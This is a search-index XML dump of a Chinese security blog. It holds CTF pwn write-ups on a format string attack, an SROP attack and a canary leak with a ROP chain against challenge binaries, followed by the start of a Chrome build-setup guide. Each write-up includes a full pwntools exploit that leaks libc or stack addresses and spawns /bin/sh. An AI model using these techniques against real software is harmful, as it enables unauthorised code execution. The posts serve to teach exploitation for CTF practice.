<?xml version="1.0" encoding="utf-8"?>
<search> 
  
    
    <entry>
      <title><![CDATA[格式化字符串漏洞利用实战]]></title>
      <url>/2017/12/17/pwn_with_format_decoder.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>格式化字符串漏洞也是一种比较常见的漏洞利用技术。<code>ctf</code> 中也经常出现。</p>
<p>本文以 <code>njctf</code> 线下赛的一道题为例进行实战。</p>
<p>题目链接：<a href="https://gitee.com/hac425/blog_data/blob/master/decoder" target="_blank" rel="external">https://gitee.com/hac425/blog_data/blob/master/decoder</a></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>程序的流程如下</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134756777207wotnxfu.png?imageslim" alt="paste image"></p>
<p>部分函数已经进行了标注，看程序打印出来的提示信息就知道这个是一个 <code>base64</code> 解码的程序，然后可以通过 <code>猜测 + 验证</code> 的方式，找到那个 用于 <code>base64</code> 解码的函数。</p>
<p>这个程序的漏洞在于将 <code>base64</code> 解码后的字符串直接传入 <code>snprintf</code>, 作为 <code>format</code> 进行处理， 格式化漏洞。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134762004787vfa2tjp.png?imageslim" alt="paste image"></p>
<p>通过格式化串可以 <strong>任意写/任意读</strong> ， 不过这里一次格式化之后就会往下一种走到程序末尾。所以这里我采用 修改 <code>printf got</code>的值 为 <code>rop gadgets</code>,然后进行 <code>rop</code>.</p>
<p>还需要注意前面还有<code>check</code> ,不满足 <code>base64</code> 的格式规范的字符串是触发不了漏洞的。不过我们可以绕过这些 <code>check</code>。</p>
<p>程序程序获取输入时使用的是 <code>read</code> 函数，然而后面的 <code>base64_check</code> 和 <code>base64_decode</code> 用到的输入的长度都是使用 <code>strlen</code> 获取的。<code>strlen</code> 是通过搜索 <code>\x00</code> 来确定字符串的长度， 而通过 <code>read</code> 我们可以输入 <code>\x00</code>， 所以我们在正常 <code>base64</code> 后面加上 <code>\x00</code> 然后布置 <code>rop chain</code> 即可。<br>还有一个小技巧，触发漏洞时 , <code>printf</code> 函数还没有被调用，所以 <code>got</code> 表中保存的值还是没有经过 <code>重绑定</code> 的值。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513476750593syzw31hb.png?imageslim" alt="paste image"><br>为了绕过栈里面的 <code>base64</code> 字符串 ，我们需要一个 <code>add esp</code> 的 <code>gadgets</code> 可以使用 <code>ROPgadget</code>.</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513476881379j7em7v3w.png?imageslim" alt="paste image"><br>找到一个 <code>0x08048b31</code>, 和 <code>printf</code>在 <code>got</code> 表中的值只有 <code>2</code>个字节的差距，所以使用 <code>%hn</code> 可以写两个字节，写的数据为 <code>0x8b31</code>,地址为 <code>0x0804B010</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%35633c%7$hn</div></pre></td></tr></table></figure></p>
<p>然后后面调用 <code>printf</code> 时就会进入 <code>rop chain</code>, 首先通过 <code>rop</code> 调用 <code>puts</code> 打印 <code>read@got</code> 泄露 <code>libc</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134770899859p7k76ct.png?imageslim" alt="paste image"></p>
<p>然后再次触发漏洞，用刚刚 <code>leak</code>的数据，布置 <code>rop</code> 调用 <code>system(&#39;/bin/sh&#39;)</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513477156821brdloq8e.png?imageslim" alt="paste image"></p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>对于 <code>strlen</code> 如果我们可以输入 <code>\x00</code>，则它的返回值我们是可以控制的。</p>
<p>通过部分修改 <code>got</code>，执行 <code>rop</code>，要注意后面紧跟着调用的函数。</p>
<p>最后的 <code>exp</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;)</div><div class="line"></div><div class="line"></div><div class="line">p = process(&quot;./decoder&quot;)</div><div class="line"></div><div class="line">gdb.attach(p, &apos;&apos;&apos;</div><div class="line">b *0x08048C29</div><div class="line"># b *0x08048C4E  </div><div class="line">b *0x08048b31</div><div class="line"># b *0x8048c5f  </div><div class="line">c</div><div class="line"></div><div class="line">	&apos;&apos;&apos;)</div><div class="line"></div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">printf_got = 0x0804B010</div><div class="line">read_got = 0x0804B00C</div><div class="line"></div><div class="line">puts_plt = 0x08048520</div><div class="line"></div><div class="line">main_addr = 0x08048B37</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">s = &apos;%35633c%7$hn&apos;</div><div class="line">payload = base64.b64encode(s)</div><div class="line">payload += &quot;\x00&quot;  # pass check</div><div class="line">payload += &quot;A&quot; * 3 # padding</div><div class="line">payload += p32(printf_got) # addr to write</div><div class="line"># payload += cyclic(40) # find ret eip offset</div><div class="line">payload += cyclic(28)   # padding for eip</div><div class="line"></div><div class="line">payload += p32(puts_plt)</div><div class="line">payload += p32(main_addr) # ret addr, ret to main, again</div><div class="line">payload += p32(0x0804B00C)  # addr to leak</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line">p.recvuntil(&quot;THIS IS A SIMPLE BASE64 DECODER\n&quot;)</div><div class="line"></div><div class="line">read_addr = u32(p.recv(4))</div><div class="line">libc_addr = read_addr - 0xd5af0</div><div class="line">system_addr = libc_addr + 0x3ada0</div><div class="line">sh_addr = libc_addr + 1423787</div><div class="line"></div><div class="line">log.info(&quot;system: &quot; + hex(system_addr))</div><div class="line">log.info(&quot;/bin/sh: &quot; + hex(sh_addr))</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">s = &apos;%35633c%7$hn&apos;</div><div class="line">payload = base64.b64encode(s)</div><div class="line">payload += &quot;\x00&quot;  # pass check</div><div class="line">payload += &quot;A&quot; * 3 # padding</div><div class="line">payload += p32(printf_got) # addr to write</div><div class="line"># payload += cyclic(40) # find ret eip offset</div><div class="line">payload += cyclic(28)   # padding for eip</div><div class="line"></div><div class="line">payload += p32(system_addr)</div><div class="line">payload += p32(main_addr) # ret addr, ret to main, again</div><div class="line">payload += p32(sh_addr)  # addr to leak</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> format string </tag>
            
            <tag> exploit </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[srop实战]]></title>
      <url>/2017/12/16/pwn_with_srop.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>srop</code> 的作用比较强，在条件允许的情况下，尽量使用它。题目来自于 <code>i春秋</code>的一个比赛。</p>
<p>题目链接：<br><a href="https://gitee.com/hac425/blog_data/blob/master/smallest" target="_blank" rel="external">https://gitee.com/hac425/blog_data/blob/master/smallest</a></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>程序非常的简单</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513417180656goqrxx0p.png?imageslim" alt="paste image"><br>使用 <code>syscall</code> 进行系统调用，往 <code>rsp</code> 读入数据，然后 <code>ret</code>, 直接就可以控制 <code>rip</code>. </p>
<p>程序非常的小，除了 这里基本没有代码，但是我们有 <code>syscall</code> ，<code>srop</code>利用之。首先明确目标。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">execve(“/bin/sh”, 0, 0)</div></pre></td></tr></table></figure>
<p><code>syscall</code> 的传参顺序为 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rdi,rsi,rdx,rcx,r8, r9</div></pre></td></tr></table></figure>
<p>然后 <code>rax</code> 存放 系统调用号 以及 <code>syscall</code> 的返回值。<br>所以我们需要设置 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">rax=59</div><div class="line">rdi---&gt; /bin/sh</div><div class="line">rsi=0</div><div class="line">rdx=0</div></pre></td></tr></table></figure>
<p>然后 <code>syscall</code>.就可以拿到 <code>shell</code> 了。</p>
<p>使用 <code>srop</code> 我们可以控制所有的寄存器的值。<br>所以我们需要一个可写的地址在一次<code>srop</code>结束后设置为 <code>rsp</code>.</p>
<p><strong>下面根据 <code>exp</code> 进行讲解</strong></p>
<p>首先是通过栈中环境变量，泄露栈的地址，得到一个可写的地址，用于 <code>srop</code> 时设置 <code>rsp</code>.</p>
<p>因为 <code>write</code> 的系统调用号 为 <code>1</code>,  而且 <code>stdout</code> 也为 <code>1</code>, 这样我们输入一个字符。然后通过 <code>rop</code> 跳到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mov     rdi, rax        ; fd</div><div class="line">syscall</div></pre></td></tr></table></figure>
<p>我们就能 调用 <code>write(1,rsi,rdx)</code>, 此时的 <code>rsi</code> 就是栈的地址，<code>rdx</code> 则为 <code>0x400</code>,我们就能 拿到 栈的地址。</p>
<p>有一点需要注意的是，我们需要事先布置好栈数据，然后再次进入 <code>start</code>, 控制 <code>rax</code>.因为我们要控制的 <code>rax</code> 值小于 我们需要布置的数据的长度。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">again = 0x4000B0         #xor     rax, rax</div><div class="line">rdi_rsi_sys = 0x04000BB  # mov     rdi, rax</div><div class="line"></div><div class="line">payload = p64(again)</div><div class="line">payload += p64(rdi_rsi_sys)</div><div class="line">payload += p64(again)  # addr for after leak</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">sleep(0.2)</div><div class="line"></div><div class="line">log.info(&quot;set stack for call write(1,....)&quot;)</div><div class="line"># pause()</div><div class="line"></div><div class="line">p.send(&apos;\xbb&apos;)</div><div class="line">data = p.recv()</div><div class="line">sleep(0.2)</div><div class="line"></div><div class="line">stack_addr = u64(data[0x10:0x18]) - 0x253</div><div class="line">log.info(hex(stack_addr))</div><div class="line"></div><div class="line">log.info(&quot;set rax=1, and ret to rdi_rsi_sys to call write(1,....)&quot;)</div></pre></td></tr></table></figure>
<p>然后就是 <code>srop</code> 了。首先使用 <code>srop</code> 修改 <code>rsp</code>到 我们 一个刚刚泄露的地址.设置好 <code>/bin/sh</code>, 这么做的原因是，在一个确定地址处设置好 <code>/bin/sh</code>，用于后面 <code>getshell</code>.</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134185188140sj1uelb.png?imageslim" alt="paste image"></p>
<p>然后又回到开头，设置 <code>SigreturnFrame</code>, 此时已经可以确定<code>/bin/sh</code> 的地址了。设置好 寄存器。<code>srop</code>之后，再次 <code>syscall</code> 执行<br><code>execve(“/bin/sh”, 0, 0)</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134185607335pktg6kj.png?imageslim" alt="paste image"></p>
<h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><p>很多东西调试一遍就清楚了。调试 <code>exp</code>, 写一点就调试一点。<code>srop</code> 时 ,栈顶开始为 <code>SigreturnFrame</code>.</p>
<p>参考：</p>
<p><a href="http://blog.csdn.net/qq_29343201/article/details/72627439" target="_blank" rel="external">http://blog.csdn.net/qq_29343201/article/details/72627439</a></p>
<p>完整的 <code>exp</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line">from time import sleep</div><div class="line">context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;)</div><div class="line"></div><div class="line">p = process(&quot;./smallest&quot;)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"># gdb.attach(p, &apos;&apos;&apos;</div><div class="line"># bp *0x004000BE </div><div class="line"></div><div class="line"># 	&apos;&apos;&apos;)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">again = 0x4000B0         #xor     rax, rax</div><div class="line">rdi_rsi_sys = 0x04000BB  # mov     rdi, rax</div><div class="line"></div><div class="line">payload = p64(again)</div><div class="line">payload += p64(rdi_rsi_sys)</div><div class="line">payload += p64(again)  # addr for after leak</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">sleep(0.2)</div><div class="line"></div><div class="line">log.info(&quot;set stack for call write(1,....)&quot;)</div><div class="line"># pause()</div><div class="line"></div><div class="line">p.send(&apos;\xbb&apos;)</div><div class="line">data = p.recv()</div><div class="line">sleep(0.2)</div><div class="line"></div><div class="line">stack_addr = u64(data[0x10:0x18]) - 0x253</div><div class="line">log.info(hex(stack_addr))</div><div class="line"></div><div class="line">log.info(&quot;set rax=1, and ret to rdi_rsi_sys to call write(1,....)&quot;)</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line"># pause()</div><div class="line"></div><div class="line"></div><div class="line"># swtch rsp ---&gt; to leak addr, for get /bin/sh addr</div><div class="line"></div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rsp = stack_addr # after sigretrun, rsp</div><div class="line">frame.rip = again    # ret to begin</div><div class="line">payload = p64(again)</div><div class="line">payload += &apos;d&apos; * 8</div><div class="line">payload += str(frame)</div><div class="line"></div><div class="line">sleep(0.2)</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line"></div><div class="line">syscall_addr = 0x04000BE </div><div class="line"></div><div class="line">payload = p64(syscall_addr)</div><div class="line">payload += &apos;\x11&apos; * (15 - len(payload))</div><div class="line"></div><div class="line">pause()</div><div class="line">sleep(0.2)</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">log.info(&quot;switch stack done&quot;)</div><div class="line">pause()</div><div class="line"></div><div class="line">payload = p64(again)</div><div class="line">payload += &quot;B&quot; * 8</div><div class="line"></div><div class="line">frame = SigreturnFrame()</div><div class="line">frame.rsp = stack_addr # after sigretrun, rsp</div><div class="line">frame.rip = syscall_addr    # ret to begin</div><div class="line"></div><div class="line">frame.rax = 59</div><div class="line"></div><div class="line">frame.rdi = stack_addr + 0x10 + 0xf8</div><div class="line"></div><div class="line">payload += str(frame)</div><div class="line">payload += &quot;/bin/sh\x00&quot;</div><div class="line"></div><div class="line">p.send(payload)</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">payload = p64(syscall_addr)</div><div class="line">payload += &apos;\x11&apos; * (15 - len(payload))</div><div class="line">p.send(payload)</div><div class="line"></div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> rop </tag>
            
            <tag> srop </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[syscall to rop]]></title>
      <url>/2017/12/16/syscall_to_rop.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p><code>hitcon 2017</code> 的 <code>start</code> 题，比较简单，练练手。</p>
<p>题目链接：</p>
<p><a href="https://gitee.com/hac425/blog_data/tree/master/hitcon2017" target="_blank" rel="external">https://gitee.com/hac425/blog_data/tree/master/hitcon2017</a></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513405464132pvttkl9d.png?imageslim" alt="paste image"></p>
<p>往 <code>rbp-0x20</code> 读入 <code>0xd9</code> 的数据，溢出。<br>程序开了 <code>cancary</code> ，又后面直接 <code>puts</code> 把我们输入的打印出来</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513405574819gtyg37m3.png?imageslim" alt="paste image"></p>
<p>我们可以直接溢出到 <code>cancary</code>, 然后用 <code>puts</code> 泄露 <code>cancary</code>， 这里有个小 <code>tips</code> , <code>cancary</code> 的最低位 为 <code>\x00</code>, 我们需要多多溢出一个 字节，覆盖掉这个 <code>\x00</code>, 这样才能 泄露 <code>cancary</code>。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134057198437r3x6q4n.png?imageslim" alt="paste image"><br>拿到 <code>cancary</code> 后就是正常的 <code>rop</code> 了，直接使用 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ROPgadget --binary ./start --ropchain</div></pre></td></tr></table></figure>
<p>生成 <code>rop</code> 链，不过此时的 <code>rop</code> 链太长，我们需要改一改。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1513405845676igvlyleg.png?imageslim" alt="paste image"></p>
<p>后面用来大量的  <code>add</code> 来设置 <code>rax</code> 设置后面的 <code>syscall</code> 的系统调用号。最后调用 <code>execve(“/bin//sh”, 0, 0)</code>, 把这一大串直接用前面找到的 <code>gadgets</code> 替换掉即可。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15134060054129ceaklcy.png?imageslim" alt="paste image"><br>长度刚好。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>rop</code> 没必要一个一个手撸， 改改生成的就行，然后就是 <code>send</code> 之间一定要 <code>sleep</code> ,要不然玄学……</p>
<p>完整exp</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div></pre></td><td class="code"><pre><div class="line">#!/usr/bin/env python</div><div class="line"># encoding: utf-8</div><div class="line"></div><div class="line">from pwn import *</div><div class="line">context.log_level = &quot;debug&quot;</div><div class="line"></div><div class="line">from struct import pack</div><div class="line">import time</div><div class="line"></div><div class="line"># Padding goes here</div><div class="line">p = &apos;&apos;</div><div class="line"></div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x00000000004017f7) # pop rsi ; ret</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x00000000006cc080) # @ .data</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x000000000047a6e6) # pop rax ; pop rdx ; pop rbx ; ret</div><div class="line">p += &apos;/bin//sh&apos;</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x4141414141414141) # padding</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x4141414141414141) # padding</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x0000000000475fc1) # mov qword ptr [rsi], rax ; ret</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x00000000004017f7) # pop rsi ; ret</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x00000000006cc088) # @ .data + 8</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x000000000042732f) # xor rax, rax ; ret</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x0000000000475fc1) # mov qword ptr [rsi], rax ; ret</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x00000000004005d5) # pop rdi ; ret</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x00000000006cc080) # @ .data</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x00000000004017f7) # pop rsi ; ret</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x00000000006cc088) # @ .data + 8</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x0000000000443776) # pop rdx ; ret</div><div class="line">p += pack(&apos;&lt;Q&apos;, 0x00000000006cc088) # @ .data + 8</div><div class="line"></div><div class="line">p += p64(0x000000000047a6e6)</div><div class="line">p += p64(59)</div><div class="line">p += p64(0)</div><div class="line">p += p64(0)</div><div class="line">p += p64(0x0000000000468e75)</div><div class="line"></div><div class="line"></div><div class="line">print(hex(len(p)))</div><div class="line"></div><div class="line">print hex(len(p))</div><div class="line">rop = p</div><div class="line"></div><div class="line">r  = process(&quot;./start&quot;)</div><div class="line"># gdb.attach(r, &apos;&apos;&apos;</div><div class="line"># # bp *0x0400B5C</div><div class="line"># bp *0x0400B96</div><div class="line"># c</div><div class="line"></div><div class="line"># 	&apos;&apos;&apos;)</div><div class="line"></div><div class="line">pause()</div><div class="line"></div><div class="line"># it could send &quot;b&quot; *0x18 + &quot;\n&quot;</div><div class="line">r.sendline(&quot;b&quot; * ( 0x20 - 0x8 ))</div><div class="line"></div><div class="line">time.sleep(0.2)</div><div class="line">r.recvuntil(&quot;b&quot; * ( 0x20 - 0x8 ))</div><div class="line">r.recv(1)</div><div class="line">cancary = u64(&quot;\x00&quot; + r.recv(7))</div><div class="line"></div><div class="line">log.info(&quot;get cancary: &quot; + hex(cancary))</div><div class="line">pause()</div><div class="line"></div><div class="line">payload = &quot;exit\n\x00&quot;</div><div class="line">payload += &quot;b&quot; * ( 0x20 - 0x8 - len(payload))  # padding for cancary</div><div class="line">payload += p64(cancary)</div><div class="line">payload += &quot;A&quot; * 8  # padding for ret </div><div class="line">payload += rop    # rip</div><div class="line"></div><div class="line"></div><div class="line">print hex(len(payload))</div><div class="line"></div><div class="line">r.sendline(payload)</div><div class="line">time.sleep(0.2)</div><div class="line"></div><div class="line">r.interactive()</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> rop </tag>
            
            <tag> syscall </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Play-with-chrome之环境搭建]]></title>
      <url>/2017/11/27/have_fun_with_chrome_part1.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>浏览器漏洞在 <code>APT</code> 攻击中用的比较多，而且这基本上是用户上网的标配了，所以研究浏览器的漏洞是十分有前景的，我认为。我选择 <code>chrome</code> 浏览器 ( <code>chromium</code>和 <code>chrome</code>之间的关系请自行百度 )为研究对象，主要原因如下： </p>
<ul>
<li>用户基数大，大量的用户使用 <code>chrome</code>  或者由 <code>chrome</code> 改装的浏览器。</li>
<li>安卓从 <code>4.4</code> 就已经开始使用 <code>chromium</code> 和 <code>v8</code> 作为 <code>webkit</code>，所以<code>chrome</code> 中的漏洞极有可能在 安卓上也有。</li>
</ul>
<p>工欲善其事，必先利其器 , 本文主要讲环境的搭建，包括 <code>chrome</code>的编译与调试 &amp;&amp; <code>v8</code> 引擎到的编译与调试。</p>
<p>测试环境</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Win10 64 位， Visual Studio 2015</div></pre></td></tr></table></figure>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><h4 id="Chrome编译"><a href="#Chrome编译" class="headerlink" title="Chrome编译"></a>Chrome编译</h4><p><strong>Visual Studio 2015</strong></p>
<p>如果你有比较稳定（<strong>速度要快，不然得下特别久</strong>）的 <code>翻墙</code> 方案，可以直接按照官方的教程来。</p>
<p>在不能 <code>翻墙</code> 时，可以按照我的方案来。</p>
<p>首先下载下面的资源, 其中包括 <code>chrome 58</code> 的源代码， 以及编译时需要的工具。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">链接: https://pan.baidu.com/s/1qXMy19U 密码: 49kx</div></pre></td></tr></table></figure>
<p>然后下载安装 <code>Visual Studio 2015</code> , 在安装的时候除了 <code>移动开发相关</code> 的取消掉，其他的都选上，以免重来 , 要不然重新安装又得花特别长的时间。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511797573213lqdl1irn.png?imageslim" alt="paste image"></p>
<p>如果系统语言是 <code>中文</code> 的话还需要，修改 <code>非Unicode 程序的语言</code> 为 <code>英语(美国)</code>  , 如下图所示</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511797829186y0k8z77e.png?imageslim" alt="paste image"></p>
<p><strong>depot_tools</strong></p>
<p>然后解压 <code>depot_tools-2017-1-ALL.rar</code> 到一个目录，目录名不要有 <code>空格</code>, <code>中文</code> 。然后把目录添加到环境变量，后面编译时要用到。</p>
<p>比如我的 <code>depot_tools</code> 的目录是 <code>D:\depot_tools\depot_tools</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15117981790191rhl9y6l.png?imageslim" alt="paste image"></p>
<p>然后新建一个 <code>DEPOT_TOOLS_WIN_TOOLCHAIN</code> 系统变量， 其值设为 <code>0</code>.</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1511798411307ye1pwmcl.png?imageslim" alt="paste image"></p>
<p><strong>设置 chromium 源码</strong></p>
<p>首先解压 <code>chromium</code> 到一个目录，然后解压 <code>develop-for-Stable-chromium-58.0.3029.81.zip</code> 文件，然后拷贝相应文件夹到  <code>chromium</code> 源码目录，覆盖掉相应的文件夹。</p>
<p><strong>编译</strong></p>
<p>进入源码目录，执行命令，生成编译需要的文件和 <code>vs 2015</code> 的解决方案。</p>
